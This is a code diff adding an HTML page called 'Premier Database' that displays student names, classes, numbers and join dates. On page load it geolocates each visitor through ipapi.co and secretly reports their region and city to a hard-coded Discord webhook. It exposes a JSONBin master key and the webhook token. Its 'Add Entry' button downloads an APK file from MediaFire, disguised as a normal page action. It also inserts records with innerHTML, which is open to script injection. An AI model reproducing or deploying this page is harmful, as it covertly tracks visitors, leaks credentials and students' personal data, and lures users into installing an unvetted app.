@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Premier Database</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin:0;
+  font-family: "Segoe UI", Tahoma;
+  background:#f5f7fa;
+  padding:25px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  color:#222;
+}
+
+h1{
+  font-size:26px;
+  margin-bottom:15px;
+  color:#1a237e;
+}
+
+.box{
+  background:#ffffff;
+  width:95%;
+  max-width:700px;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 4px 16px rgba(0,0,0,0.1);
+  border:1px solid #e0e0e0;
+  margin-bottom:20px;
+}
+
+.info{
+  font-size:15px;
+  margin-bottom:10px;
+}
+
+.green{color:green;font-weight:bold;}
+.red{color:red;font-weight:bold;}
+
+input{
+  width:100%;
+  padding:10px;
+  margin:10px 0;
+  border-radius:6px;
+  border:1px solid #bbb;
+  font-size:15px;
+}
+
+table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top:15px;
+}
+
+th,td{
+  padding:10px;
+  border-bottom:1px solid #ddd;
+  font-size:14px;
+}
+
+button{
+  width:100%;
+  padding:12px;
+  background:#1976d2;
+  border:none;
+  border-radius:6px;
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  margin-top:15px;
+  cursor:pointer;
+}
+button:hover{
+  background:#0d47a1;
+}
+</style>
+</head>
+
+<body>
+
+<h1>Premier Database</h1>
+
+<div class="box" id="adminBox">
+  <div class="info">Admin Log: <span id="light">•</span></div>
+  <div class="info">Admin Region: <b id="region"></b></div>
+</div>
+
+<div class="box">
+  <input type="text" id="search" placeholder="Search (name, number, class, date...)">
+  
+  <table id="dataTable">
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>Class</th>
+        <th>Number</th>
+        <th>Join Date</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <button onclick="window.open('https://www.mediafire.com/file/mtzmofk4p83hbvz/PREMIRE+ADMIN_1.0.apk/file','_blank')">Add Entry</button>
+</div>
+
+<script>
+const JSONBIN_ID = "692d6c3b43b1c97be9d02d2c";
+const JSONBIN_KEY = "$2a$10$O4BNOnc06HJiXrEj3a.mCegLmq0wYd3YFPtuUey2/7k7rwi7ke4nm";
+const WEBHOOK = "https://discord.com/api/webhooks/1444203958192308294/YwZSgqSrIoNOYFvuFdhA3AI9-vct-oN8cgDsQ8mINkHVc6bpjJExAstoi0VElDrFBtO-";
+
+async function sendWebhookLog(info) {
+  await fetch(WEBHOOK, {
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      content: "**Premier Database — Viewer Log**",
+      embeds: [{
+        title: "Page Accessed",
+        color: 3447003,
+        fields: [
+          { name: "Time", value: new Date().toLocaleString() },
+          { name: "Region", value: info.region },
+          { name: "City", value: info.city },
+          { name: "Allowed", value: info.allowed ? "YES" : "NO" },
+          { name: "Total Students", value: info.total.toString() }
+        ]
+      }]
+    })
+  });
+}
+
+async function loadData(){
+
+  const geo = await fetch("https://ipapi.co/json")
+    .then(r=>r.json())
+    .catch(()=>null);
+
+  const userRegion = (geo && geo.region) ? geo.region : "Unknown";
+  const userCity = (geo && geo.city) ? geo.city : "Unknown";
+
+  const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
+    headers:{ "X-Master-Key": JSONBIN_KEY }
+  });
+
+  const data = await res.json();
+  const db = data.record;
+
+  document.getElementById("region").innerText = db.admin_region;
+
+  const allowed = db.allowed_regions.includes(userRegion);
+
+  sendWebhookLog({
+    region: userRegion,
+    city: userCity,
+    allowed: allowed,
+    total: db.students.length
+  });
+
+  if(!allowed){
+    window.location.href = "index.html";
+    return;
+  }
+
+  document.getElementById("light").className = "green";
+
+  const body = document.querySelector("#dataTable tbody");
+  body.innerHTML = "";
+
+  db.students.forEach(s=>{
+    body.innerHTML += `
+      <tr>
+        <td>${s.name}</td>
+        <td>${s.class}</td>
+        <td>${s.number}</td>
+        <td>${s.join_date}</td>
+      </tr>`;
+  });
+
+  document.getElementById("search").addEventListener("input", function(){
+    const q = this.value.toLowerCase();
+    [...body.rows].forEach(row=>{
+      row.style.display = row.innerText.toLowerCase().includes(q) ? "" : "none";
+    });
+  });
+}
+
+loadData();
+</script>
+</body>
+</html>
